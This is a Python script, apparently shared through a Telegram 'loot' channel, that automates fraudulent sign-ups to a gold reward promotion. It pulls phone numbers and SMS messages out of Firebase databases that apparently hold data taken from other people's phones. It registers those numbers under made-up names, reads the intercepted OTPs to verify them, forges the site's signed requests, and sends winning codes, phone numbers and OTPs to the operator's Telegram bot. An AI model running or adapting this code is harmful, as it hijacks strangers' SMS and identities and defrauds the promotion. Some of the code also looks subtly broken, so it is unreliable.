#!/usr/bin/env python3
# ============================================================================
#   Loot Junction — Unified Auto-Register & Code Watcher
#   Managed by Loot Junction (@LootJunction)
# ============================================================================

import os
import re
import sys
import json
import time
import random
import string
import threading
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.stdout.reconfigure(encoding="utf-8")
import functools
print = functools.partial(print, flush=True)

# ─── Configuration & Credentials (DUMMY PLACEHOLDERS FOR USERS) ───
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_ID = 123456789  # Put your Telegram Admin ID here
AUTHOR = "Loot Junction"
CHANNEL = "@LootJunction"
BRAND_LINE = f"━━━━━━━━━━━━━━━━━━━━━━\n📢 Channel: {CHANNEL}\n👨‍💻 Managed by: {AUTHOR}"

BATCH_CODE = "KKD2LS01261026"
BASE_URL = "https://golddropgolddhamaka.com"
REDEEM_URL = "https://www.golddropwins.com/"
PHOTO_FILE = Path("photo.jpg")
PINCODE = "500001"
OTP_TIMEOUT = 60
OTP_POLL_INTERVAL = 1
WORKERS = 5
CODE_LEN = 12

FB_FILE = "loot_firebase.txt"
BLACKLIST_FILE = "blacklist.txt"
SUCCESS_FILE = "loot_success.txt"

_file_lock = threading.Lock()
engine_running = False
stats = {"success": 0, "rewards": 0, "timeouts": 0, "errors": 0}
stats_lock = threading.Lock()

def send_telegram(text):
    if "YOUR_BOT_TOKEN" in BOT_TOKEN:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": ADMIN_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass

def load_blacklist():
    if not os.path.exists(BLACKLIST_FILE):
        return set()
    with open(BLACKLIST_FILE, encoding="utf-8") as f:
        return set(line.strip() for line in f if line.strip())

def add_to_blacklist(phone):
    with _file_lock:
        with open(BLACKLIST_FILE, "a", encoding="utf-8") as f:
            f.write(f"{phone}\n")

def save_success_log(phone, ref, reward=None):
    with _file_lock:
        with open(SUCCESS_FILE, "a", encoding="utf-8") as f:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            extra = f" | reward:{reward}" if reward else ""
            f.write(f"{ts} | +91{phone} | ref:{ref}{extra} | {CHANNEL}\n")

def load_firebase_urls():
    if not os.path.exists(FB_FILE):
        return []
    urls = []
    with open(FB_FILE, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                clean_url = line.split("|||")[0].strip().rstrip("/")
                if clean_url not in urls:
                    urls.append(clean_url)
    return urls

# ─── Parsing Helpers ───
PHONE_PATTERNS_WEIGHTED = [
    (re.compile(r'(?:phone|mobile|number|mob|no)[\s:]*(?:\+?91[\s-]?)?([6-9]\d{9})', re.I), 15),
    (re.compile(r'\b(?:\+91|91)?([6-9]\d{9})\b'), 10),
]

SMS_SUBPATHS = ["messages", "sms", "inbox", "Sms", "SMS", "callLogs", "calls", "notifications"]

OTP_PATTERNS = [
    re.compile(r"OTP to register is\s*(\d{4,8})", re.I),
    re.compile(r"OTP[:\s]+(?:is\s*)?(\d{4,8})", re.I),
    re.compile(r"\b(\d{6})\b"),
]

REWARD_PATTERNS = [
    re.compile(rf"Reward\s*Code\s*is\s*\*?\s*([A-Z0-9]{{{CODE_LEN}}})\b", re.I),
    re.compile(rf"Reward\s*Code[^\w]{{0,20}}([A-Z0-9]{{{CODE_LEN}}})\b", re.I),
    re.compile(rf"Reward\s*Code\s*is\s*\*?\s*([A-Za-z0-9]{{8,20}}?)\b", re.I),
]

def _clean_phone(raw):
    if not raw:
        return None
    digits = re.sub(r"\D", "", str(raw))
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    if digits.startswith("0") and len(digits) == 11:
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789":
        return digits
    return None

def extract_devices(firebase_url):
    session = requests.Session()
    session.verify = False
    root_keys = ["clients", "devices", "users", "Clients", "Devices"]
    raw_data = None
    for rk in root_keys:
        try:
            r = session.get(f"{firebase_url}/{rk}.json", timeout=10)
            if r.status_code == 200 and isinstance(r.json(), dict):
                raw_data = r.json()
                break
        except Exception:
            continue
    if not raw_data:
        return []

    result = []
    seen = set()
    for cid, dev in raw_data.items():
        if not isinstance(dev, dict):
            continue
        phone = None
        sims = dev.get("sims", [])
        if isinstance(sims, dict):
            sims = list(sims.values())
        if isinstance(sims, list):
            for sim in sims[:2]:
                if isinstance(sim, dict):
                    for k in ("phoneNumber", "phone", "number", "mobNo"):
                        p = _clean_phone(sim.get(k))
                        if p:
                            phone = p
                            break
        if not phone:
            for k in ("mobNo", "phoneNumber", "phone", "mobile"):
                p = _clean_phone(dev.get(k))
                if p:
                    phone = p
                    break

        if phone and phone not in seen:
            seen.add(phone)
            result.append({"client_id": cid, "phone": phone, "fb_url": firebase_url})
    return result

def get_last_msg_key(firebase_url, device_id):
    session = requests.Session()
    session.verify = False
    for subpath in SMS_SUBPATHS:
        try:
            r = session.get(f'{firebase_url}/{subpath}/{device_id}.json?orderBy="$key"&limitToLast=1', timeout=4)
            if r.status_code == 200 and isinstance(r.json(), dict) and r.json():
                return sorted(r.json().keys())[-1], subpath
        except Exception:
            continue
    return None, None

def extract_otp(text):
    for rx in OTP_PATTERNS:
        m = rx.search(text or "")
        if m:
            return m.group(1)
    return ""

def extract_reward(text):
    for rx in REWARD_PATTERNS:
        m = rx.search(text or "")
        if m:
            return m.group(1).rstrip(".*")
    return ""

def wait_for_otp_and_reward(firebase_url, device_id, last_key, active_subpath):
    deadline = time.time() + OTP_TIMEOUT
    session = requests.Session()
    session.verify = False
    poll_paths = [active_subpath] + [s for s in SMS_SUBPATHS if s != active_subpath] if active_subpath else SMS_SUBPATHS

    while time.time() < deadline:
        for subpath in poll_paths:
            try:
                r = session.get(f'{firebase_url}/{subpath}/{device_id}.json?orderBy="$key"&limitToLast=15', timeout=4)
                if r.status_code != 200:
                    continue
                msgs = r.json()
                if not isinstance(msgs, dict):
                    continue
                for key in sorted(msgs.keys(), reverse=True):
                    if last_key and key <= last_key:
                        break
                    msg = msgs[key]
                    text = str(msg.get("body") or msg.get("message") or msg.get("text") or "") if isinstance(msg, dict) else str(msg)
                    
                    otp = extract_otp(text)
                    reward = extract_reward(text)
                    if otp or reward:
                        return otp, reward, text
            except Exception:
                continue
        time.sleep(OTP_POLL_INTERVAL)
    return None, None, None

def encode_data(payload: dict, t_ms: int, data_key: str) -> str:
    import base64, hashlib, hmac
    l = base64.b64encode(str(t_ms).encode("utf-8")).decode("ascii")
    d = base64.b64encode(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")).decode("ascii")
    hmac_key = data_key[4:18]
    h_hex = hmac.new(hmac_key.encode("utf-8"), f"{l}.{d}".encode("utf-8"), hashlib.sha256).hexdigest()
    h_b64 = base64.b64encode(h_hex.encode("utf-8")).decode("ascii")
    p = random.randint(1, 6)
    m = random.randint(2, 8)
    salt = "".join(random.choices(string.ascii_letters + string.digits, k=m))
    return f"{l}.{d}.{m}{p}{h_b64[:p]}{salt}{h_b64[p:]}"

def process_phone(phone, fb_url, client_id, blacklist):
    if phone in blacklist:
        return

    try:
        master_key = str(random.randint(1000000000, 9999999999))
        s = requests.Session()
        s.cookies.set("gold-drop-id", master_key, domain="golddropgolddhamaka.com")
        s.verify = False

        r1 = s.post(f"{BASE_URL}/api/users", json={"masterKey": master_key, "ipInfo": {"status": "success", "region": "TS", "zip": PINCODE}}, headers={"content-type": "application/json"})
        resp1 = r1.json()
        inner1 = json.loads(base64.b64decode(resp1["resp"]).decode())
        user_key = str(inner1.get("userKey", ""))
        data_key = inner1.get("dataKey", "")
        if not user_key:
            return

        s.post(f"{BASE_URL}/api/users/get-start/{user_key}", headers={"content-type": "application/json"})
        last_key, active_subpath = get_last_msg_key(fb_url, client_id)

        t = int(time.time() * 1000)
        first = random.choice(["Rahul", "Amit", "Vijay", "Priya", "Sneha", "Kiran"])
        last = random.choice(["Reddy", "Rao", "Kumar", "Sharma", "Patel"])
        payload = {
            "name": f"{first} {last}", "mobile": phone, "email": f"{first.lower()}{random.randint(100,9999)}@gmail.com",
            "pincode": PINCODE, "code": BATCH_CODE, "terms_accepted": "1", "userKey": user_key, "t": str(t)
        }
        encoded = encode_data(payload, t, data_key)

        photo_bytes = b""
        if PHOTO_FILE.exists():
            with open(PHOTO_FILE, "rb") as pf:
                photo_bytes = pf.read()

        r3 = s.post(f"{BASE_URL}/api/users/register/{user_key}?t={t}", files={"data": (None, encoded), "img": ("photo.jpg", photo_bytes, "image/jpeg")})
        if r3.status_code not in (200, 201):
            return

        otp, reward_code, raw_text = wait_for_otp_and_reward(fb_url, client_id, last_key, active_subpath)
        if not otp:
            with stats_lock:
                stats["timeouts"] += 1
            add_to_blacklist(phone)
            blacklist.add(phone)
            return

        t_val = int(time.time() * 1000)
        v_payload = {"otp": otp, "userKey": user_key, "t": str(t_val)}
        v_encoded = encode_data(v_payload, t_val, data_key)
        r4 = s.post(f"{BASE_URL}/api/users/verify-otp/{user_key}?t={t_val}", json={"data": v_encoded}, headers={"content-type": "application/json"})

        try:
            res_json = json.loads(base64.b64decode(r4.json()["resp"]).decode())
            win = res_json.get("win_type")
            api_reward = res_json.get("reward")

            with stats_lock:
                stats["success"] += 1

            final_code = reward_code or api_reward or ""

            if win != "none" or final_code:
                with stats_lock:
                    stats["rewards"] += 1
                msg = (
                    f"🎁 *Loot Junction REWARD CODE!*\n\n"
                    f"📱 *Phone:* +91{phone}\n"
                    f"🔑 *OTP:* `{otp}`\n"
                    f"💎 *Code:* `{final_code or 'Check Link'}`\n"
                    f"🏆 *Win Type:* {win}\n"
                    f"🔗 *Redeem:* {REDEEM_URL}\n\n"
                    f"{BRAND_LINE}"
                )
                send_telegram(msg)
                save_success_log(phone, client_id, final_code)
        except Exception:
            pass

        add_to_blacklist(phone)
        blacklist.add(phone)
        time.sleep(3)
    except Exception:
        with stats_lock:
            stats["errors"] += 1

def main():
    print("=" * 70)
    print("  Loot Junction — Unified Auto-Register & Code Watcher")
    print(f"  Managed by {AUTHOR}  |  Channel: {CHANNEL}")
    print("=" * 70)

    if "YOUR_BOT_TOKEN" in BOT_TOKEN:
        print("⚠️  WARNING: Please update BOT_TOKEN and ADMIN_ID with your actual Telegram bot credentials before running!")

    urls = load_firebase_urls()
    if not urls:
        print("⚠️  Firebase URL nahi mili! Please create 'loot_firebase.txt' and add your Firebase DB URLs.")
        return

    print(f"Loaded {len(urls)} Firebase DBs.")
    send_telegram(f"✅ *Loot Junction Unified Engine Started!*\n\n{BRAND_LINE}")

    blacklist = load_blacklist()

    while True:
        all_devices = []
        for url in urls:
            devs = extract_devices(url)
            for d in devs:
                if d["phone"] not in blacklist:
                    all_devices.append(d)

        if not all_devices:
            print("  [wait] No new devices found. Retrying in 20 seconds...")
            time.sleep(20)
            continue

        print(f"\n🚀 Processing {len(all_devices)} numbers...")
        with ThreadPoolExecutor(max_workers=WORKERS) as executor:
            futures = [executor.submit(process_phone, dev["phone"], dev["fb_url"], dev["client_id"], blacklist) for dev in all_devices]
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception:
                    pass

        print("  [sleep] Batch completed. Waiting 20 seconds for next round...")
        time.sleep(20)

if __name__ == "__main__":
    main()
